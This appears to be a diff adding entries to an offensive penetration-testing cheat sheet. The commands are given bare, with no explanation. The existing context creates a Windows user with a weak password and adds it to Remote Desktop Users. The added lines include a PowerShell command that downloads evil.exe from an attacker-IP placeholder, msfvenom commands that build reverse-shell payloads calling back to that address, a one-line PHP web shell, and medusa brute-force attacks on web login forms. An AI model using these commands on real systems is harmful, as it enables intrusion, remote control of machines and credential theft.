@@ -9,7 +9,7 @@ net user bob bob123 /ADD
 net localgroup "Remote Desktop Users" bob /ADD
 net localgroup "Users" bob /ADD
 ```
-## Starting services 
+## Starting services
 linux
 ```shell
 systemctl start ssh
@@ -23,9 +23,54 @@ linux
 systemctl enable apache2
 systemctl disable apache2
 ```
+## Download files
+
+Powershell
+```powershell
+powershell (new-object System.Net.WebClient).DownloadFile('http://[your_ip_address]/evil.exe','evil.exe')
+```
+
+## msfvenom examples
+```shell
+msfvenom -p windows/shell_reverse_tcp  HOST=[your_ip_address] LPORT=[Port] -f asp > shell.asp
+```
+
+```shell
+msfvenom -p windows/meterpreter/reverse_tcp [your_ip_address] LPORT=[Port] -f aspx > shell.aspx
+```
+
+## shells
+
+```php
+<<?php echo shell_exec($_GET['cmd']);?>
+```
+
+medusa example
+```shell
+medusa \
+  -h [target_ip] \
+  -u offsec \
+  -P nmap.lst \
+  -M web-form \
+  -m FORM:"login.php" \
+  -m DENY-SIGNAL:"Wrong Username or Password" \
+  -m FORM-DATA:"post?user=&pass=&Login=Login"
+
+
+  medusa \
+-h [target_ip]\
+-u admin \
+-P /data/dict/dict.txt \
+-M web-form \
+-m FORM:"admin/test.php" \
+-m DENY-SIGNAL:"ACCESS DENIED" \
+-m FORM-DATA:"post?u=&p=&Login=Login"
+```
+
 
 ## References
 * http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/?redirect
+* http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
 * http://pentestmonkey.net/tools/audit/unix-privesc-check
 * http://pentestmonkey.net/tools/web-shells/php-reverse-shell
 * http://resources.infosecinstitute.com/privilege-escalation-linux-live-examples/
